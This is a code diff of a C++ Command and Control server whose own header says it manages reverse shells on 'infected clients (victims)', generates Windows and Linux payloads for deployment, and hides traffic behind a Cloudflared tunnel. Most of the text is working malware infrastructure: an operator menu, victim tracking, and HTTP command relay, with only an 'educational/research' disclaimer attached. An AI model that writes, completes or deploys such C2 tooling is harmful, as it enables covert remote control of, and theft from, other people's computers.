@@ -1,3 +1,22 @@
+/**
+ * ==========================================================
+ * Remote C2 Server
+ * 
+ * This program implements a basic HTTP-based Command & Control (C2) server.
+ * The C2 server allows an operator to:
+ * 
+ * - Accept remote connections from infected clients ("victims").
+ * - Interact with each client using a reverse shell mechanism.
+ * - Generate payloads for Linux and Windows to deploy on clients.
+ * - Manage multiple clients via an interactive shell.
+ * 
+ * Communication happens via HTTP POST/GET requests tunneled through Cloudflared (optional).
+ * 
+ * Author: YOU
+ * License: For educational/research purposes only!
+ * ==========================================================
+ */
+
 #include <iostream>
 #include <cstring>
 #include <sys/types.h>
@@ -12,39 +31,79 @@
 #include <sstream>
 #include <regex>
 #include <random>
-#include <atomic>
-#include <mutex>
-
-#include "c2_utils.cpp"
-#include "PayloadGenerator.cpp"
+#include "c2_utils.cpp"            // Utility functions (banner, help, show_shell)
+#include "PayloadGenerator.cpp"    // Functions to generate OS-specific payloads
 
 using namespace std;
 
-/*----------------------- Global Variables --------------------------*/
+/**
+ * Server configuration parameters.
+ */
+int PORT;                         ///< Port on which server will run (randomized).
+int BUFFER_SIZE = 1024;            ///< Buffer size for socket communication.
+int CONNECTION_COUNT = 10;         ///< Max simultaneous pending connections.
 
-int PORT;
-int BUFFER_SIZE = 1024;
-int CONNECTION_COUNT = 10;
+/**
+ * Global variables.
+ */
+unordered_map<string, int> mp;     ///< Map of connected clients: <victim_name, socket_fd>.
+string user_input;                 ///< Stores current user input (shared with shell and client).
+string cloudflared_url;            ///< Public Cloudflared URL.
 
-unordered_map<string, int> mp; // Map of endpoint/user -> client socket fd
-string cloudflared_url;
-
-/*----------------------- Function Declarations --------------------------*/
-
+/**
+ * Function declarations.
+ */
 void server();
 void client_connection(int server_fd);
 void serve_client(string endpoint, int server_fd);
 string url_decode(const string& request);
 void shell(unordered_map<string, int>& mp, int server_fd);
+string get_victim(const char* buffer);
 
-/*----------------------- Shell Controller --------------------------*/
 /**
- * Displays the main shell controller loop.
- * Accepts user commands and triggers corresponding actions:
- *  - show shell list
- *  - generate payload
- *  - enter remote shell
- *  - close server
+ * @brief Extracts the victim name from an HTTP GET request.
+ * 
+ * The server expects the client to send a GET request of the form:
+ *     GET /?user=<victim_name> HTTP/1.1
+ * 
+ * @param buffer The raw HTTP request buffer.
+ * @return The extracted victim name, or empty string if not found.
+ */
+string get_victim(const char* buffer) {
+    string request_line(buffer);
+
+    size_t first_space = request_line.find(' ');
+    if (first_space == string::npos) return "";
+
+    size_t second_space = request_line.find(' ', first_space + 1);
+    if (second_space == string::npos) return "";
+
+    string path = request_line.substr(first_space + 1, second_space - first_space - 1);
+
+    size_t user_pos = path.find("?user=");
+    if (user_pos == string::npos) return "";
+
+    string user_value = path.substr(user_pos + 6);
+
+    size_t amp_pos = user_value.find('&');
+    if (amp_pos != string::npos) {
+        user_value = user_value.substr(0, amp_pos);
+    }
+
+    return user_value;
+}
+
+/**
+ * @brief Main shell interface for the C2 server.
+ * 
+ * Allows the operator to:
+ * - View connected clients
+ * - Enter an interactive shell with a specific client
+ * - Generate Windows/Linux payloads
+ * - Exit the server cleanly
+ * 
+ * @param mp The map of connected clients.
+ * @param server_fd The server socket file descriptor.
  */
 void shell(unordered_map<string, int>& mp, int server_fd) {
     cout << "\n[+] Welcome to Remote Shell Controller\n";
@@ -55,7 +114,7 @@ void shell(unordered_map<string, int>& mp, int server_fd) {
         cout << "[MainShell] > ";
         getline(cin >> ws, shell_command);
 
-        // Tokenize user input
+        // Tokenize the command into words.
         stringstream ss(shell_command);
         string token;
         vector<string> tokens;
@@ -63,7 +122,6 @@ void shell(unordered_map<string, int>& mp, int server_fd) {
             tokens.push_back(token);
         }
 
-        // Handle various commands
         if (shell_command == "help") {
             help();
             cout << endl;
@@ -73,14 +131,18 @@ void shell(unordered_map<string, int>& mp, int server_fd) {
         } else if (shell_command == "show shell") {
             show_shell(mp);
             cout << endl;
-        } else if (tokens.size() == 2 && tokens[0] == "shell") {
+        } 
+        else if (tokens.size() == 2 && tokens[0] == "shell") {
+            // Enter interactive shell with client.
             string victim_name = tokens[1];
             if (mp.find(victim_name) != mp.end()) {
                 serve_client(victim_name, server_fd);
             } else {
                 cout << "\n[-] Victim ID not found.\n\n";
             }
-        } else if (tokens.size() == 2 && tokens[0] == "generate") {
+        }
+        else if (tokens.size() == 2 && tokens[0] == "generate") {
+            // Generate payload for target OS.
             string os_token = tokens[1];
             if (os_token == "os=windows") {
                 string payload = payload_generator_windows(cloudflared_url);
@@ -91,20 +153,29 @@ void shell(unordered_map<string, int>& mp, int server_fd) {
             } else {
                 cout << "OS not found or not supported.\n";
             }
-        } else if (shell_command == "quit") {
+        }
+        else if (shell_command == "quit") {
+            // Cleanly close server by killing process on port.
             string command = "sudo kill $(sudo lsof -ti :" + to_string(PORT) + ") 2>&1 &";
             system(command.c_str());
             cout << "\nServer closed..." << endl;
             break;
-        } else {
+        }
+        else {
             cout << "\n[-] Unknown command. Type 'help' to see available commands.\n\n";
         }
     }
 }
 
-/*----------------------- URL Decode --------------------------*/
 /**
- * Extracts and decodes the "Result" parameter from an HTTP request body.
+ * @brief Decodes a URL-encoded "Result" parameter from an HTTP POST body.
+ * 
+ * Example:
+ *     Result=Hello%20World
+ *     -> returns "Hello World"
+ * 
+ * @param request The URL-encoded request string.
+ * @return The decoded Result value.
  */
 string url_decode(const string& request) {
     regex result_regex("Result=([^&\\s]*)");
@@ -134,13 +205,19 @@ string url_decode(const string& request) {
     return "";
 }
 
-/*----------------------- Remote Shell Handler --------------------------*/
 /**
- * Manages an interactive shell session with a given client (victim).
- * Displays results, handles input, and sends commands.
+ * @brief Interactive shell session with a specific client.
+ * 
+ * Sends operator commands to the client and prints client responses.
+ * Handles:
+ * - Command execution
+ * - Shell exit
+ * - Client disconnection
+ * 
+ * @param endpoint The victim name of the client.
+ * @param server_fd The server socket file descriptor.
  */
 void serve_client(string endpoint, int server_fd) {
-    
     bool flag = true;
     bool terminate_client = false;
     string local_user_input;
@@ -151,7 +228,7 @@ void serve_client(string endpoint, int server_fd) {
     cout << "\n[+] Entering remote shell with client '" << endpoint << "'\n";
     cout << "    Type 'quit' to return to MainShell.\n\n";
 
-    // User input thread (runs asynchronously)
+    // Launch input thread to read operator commands.
     auto input_func = [&]() {
         cout << "(Shell@" << endpoint << ") > " << flush;
         while (flag) {
@@ -163,6 +240,7 @@ void serve_client(string endpoint, int server_fd) {
             getline(cin >> ws, temp_input);
 
             if (temp_input == "exit") {
+                // Confirm before terminating client.
                 cout << "Are you sure you want to terminate the connection?\n";
                 char choice;
                 while (true) {
@@ -186,11 +264,13 @@ void serve_client(string endpoint, int server_fd) {
                     }
                 }
             } else if (temp_input == "quit") {
+                // Return to MainShell.
                 lock_guard<mutex> lock(input_mutex);
                 local_user_input = "";
                 input_ready = true;
                 flag = false;
             } else {
+                // Normal command.
                 lock_guard<mutex> lock(input_mutex);
                 local_user_input = temp_input;
                 input_ready = true;
@@ -200,11 +280,11 @@ void serve_client(string endpoint, int server_fd) {
 
     auto fut = async(launch::async, input_func);
 
-    // Main loop: read client messages + send commands
+    // Main loop: handle client messages and send commands.
     while (flag || input_ready) {
         string full_request;
 
-        // Read until full HTTP request is received
+        // Read HTTP headers.
         while (full_request.find("\r\n\r\n") == string::npos) {
             char buffer[BUFFER_SIZE] = {0};
             ssize_t valread = read(mp[endpoint], buffer, BUFFER_SIZE - 1);
@@ -223,7 +303,7 @@ void serve_client(string endpoint, int server_fd) {
             break;
         }
 
-        // Extract content-length + body
+        // Extract Content-Length header.
         size_t content_length_pos = full_request.find("Content-Length:");
         size_t body_start_pos = full_request.find("\r\n\r\n");
 
@@ -240,9 +320,9 @@ void serve_client(string endpoint, int server_fd) {
             }
         }
 
+        // Read full HTTP body.
         string body_data = full_request.substr(body_start_pos + 4);
 
-        // Read remaining body if incomplete
         while ((int)body_data.length() < content_length) {
             char buffer[BUFFER_SIZE] = {0};
             ssize_t valread = read(mp[endpoint], buffer, BUFFER_SIZE - 1);
@@ -259,7 +339,7 @@ void serve_client(string endpoint, int server_fd) {
             break;
         }
 
-        // Process response
+        // Process HTTP POST result.
         if (full_request.find("POST") != string::npos && full_request.find("ERROR:") == string::npos) {
             string result = url_decode(body_data);
 
@@ -270,11 +350,10 @@ void serve_client(string endpoint, int server_fd) {
                 cout << result << "(Shell@" << endpoint << ") > " << flush;
             }
 
-            // Force input thread to show prompt
             need_prompt = true;
         }
 
-        // Send command if ready
+        // Send command to client.
         string body;
         {
             lock_guard<mutex> lock(input_mutex);
@@ -292,14 +371,13 @@ void serve_client(string endpoint, int server_fd) {
 
         send(mp[endpoint], response.c_str(), response.length(), 0);
 
-        // If terminating client
+        // Handle exit or quit.
         if (terminate_client && body == "exit") {
             close(mp[endpoint]);
             mp.erase(endpoint);
             break;
         }
 
-        // If quitting shell only
         if (!flag && !terminate_client) {
             break;
         }
@@ -308,10 +386,15 @@ void serve_client(string endpoint, int server_fd) {
     cout << "\n[+] Exited remote shell of client '" << endpoint << "'\n\n";
 }
 
-/*----------------------- Client Connection Handler --------------------------*/
 /**
- * Handles new incoming client connections.
- * Stores new clients in map and responds with 200 OK.
+ * @brief Accepts incoming client connections in a separate thread.
+ * 
+ * For each client:
+ * - Extract victim name.
+ * - Store socket fd in map.
+ * - Send initial HTTP 200 OK response.
+ * 
+ * @param server_fd The server socket file descriptor.
  */
 void client_connection(int server_fd) {
     socklen_t addrlen;
@@ -327,16 +410,13 @@ void client_connection(int server_fd) {
 
         char buffer[BUFFER_SIZE] = {0};
         int valread = read(client_conn, buffer, BUFFER_SIZE - 1);
-        
+
         if (valread <= 0) {
             close(client_conn);
             break;
         }
 
-        string request_line(buffer);
-        int find = request_line.find("?user=");
-        string endpoint = request_line.substr(find + 6);
-
+        string endpoint = get_victim(buffer);
         if (mp.find(endpoint) == mp.end()) {
             cout << "\n====================================\n";
             cout << "  [+] New connection: " << endpoint << "\n";
@@ -344,21 +424,20 @@ void client_connection(int server_fd) {
             cout << "[MainShell] > " << flush;
         }
 
+        string body = "";
         mp[endpoint] = client_conn;
-
         string response = "HTTP/1.1 200 OK\r\n"
                           "Content-Type: text/plain\r\n"
-                          "Content-Length: 0\r\n"
+                          "Content-Length: " + to_string(body.length()) + "\r\n"
                           "Connection: keep-alive\r\n"
-                          "\r\n";
+                          "\r\n" + body;
 
         send(mp[endpoint], response.c_str(), response.length(), 0);
     }
 }
 
-/*----------------------- HTTP Server --------------------------*/
 /**
- * Initializes the HTTP server and launches shell controller.
+ * @brief Starts the C2 server.
  */
 void server() {
     int server_fd;
@@ -395,15 +474,17 @@ void server() {
     close(server_fd);
 }
 
-/*----------------------- Main --------------------------*/
 /**
- * Entry point.
- * Generates random port, starts Cloudflare tunnel, and launches server.
+ * @brief Entry point of the C2 server application.
+ * 
+ * Starts the Cloudflared tunnel (if possible), launches the server.
+ * 
+ * @return int 
  */
 int main() {
     banner();
 
-    // Random port generation
+    // Pick random port in range 1000-10000.
     random_device rd;
     mt19937 gen(rd());
     uniform_int_distribution<> dis(1000, 10000);
@@ -411,8 +492,10 @@ int main() {
 
     cloudflared_url = start_cloudflared(PORT);
     if (cloudflared_url.size() <= 0) {
-        cout << "Failed to create tunnel";
-        cloudflared_url = "http://127.0.0.1:" + to_string(PORT);
+        string ip= get_device_ip();
+        cout << "Failed to create tunnel"<<endl;
+        cloudflared_url = "http://"+ip+':'+ to_string(PORT);
+        cout<<cloudflared_url;
     } else {
         cout << "Tunnel created successfully" << endl;
     }
